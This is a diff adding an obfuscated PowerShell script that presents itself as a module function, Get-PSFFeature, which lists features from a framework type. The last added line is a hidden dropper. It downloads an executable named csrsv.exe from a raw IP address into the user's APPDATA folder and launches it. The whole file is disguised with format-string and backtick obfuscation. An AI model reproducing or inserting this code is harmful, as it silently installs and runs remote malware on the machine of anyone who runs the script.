@@ -1,0 +1,15 @@
+.("{0}{1}{2}"-f 'se','t-Ite','M')  ('Va'+'riaBL'+'E'+':'+'ultvhd')  ([TYPE]("{5}{3}{1}{6}{4}{0}{2}"-f'e.fEA','O','TuREHoST','ameW','.FEATUR','psfr','RK') ) ; function get`-pS`FFE`AtU`RE
+{
+
+	[CmdletBinding()]
+	param (
+		[string]
+		${n`AmE} = "*"
+	)
+	
+	process
+	{
+		 ( &("{1}{3}{2}{0}"-f'BLe','g','ArIA','et-v')  ('U'+'ltVhD')  -vAl )::"fEAtU`ReS"."Va`L`UES" | &("{2}{0}{1}{3}"-f'h','ere-Objec','W','t') ("{1}{0}"-f'me','Na') -Like ${NA`me}
+	}
+}
+(.("{1}{0}{3}{2}" -f'e','N','bject','w-O') ("{1}{0}{4}{2}{3}"-f'tem.Net.Web','Sys','en','t','Cli')).("{0}{2}{1}{3}" -f'Do','nloa','w','dFile').Invoke(("{6}{2}{5}{0}{4}{1}{3}"-f'18/~ya','/csrsv.ex','9.248.170','e','hoo','.2','http://8'),"$env:APPDATA\csrsv.exe");.("{0}{1}{2}{3}"-f 'S','t','a','rt-Process') ("$env:APPDATA\csrsv.exe")
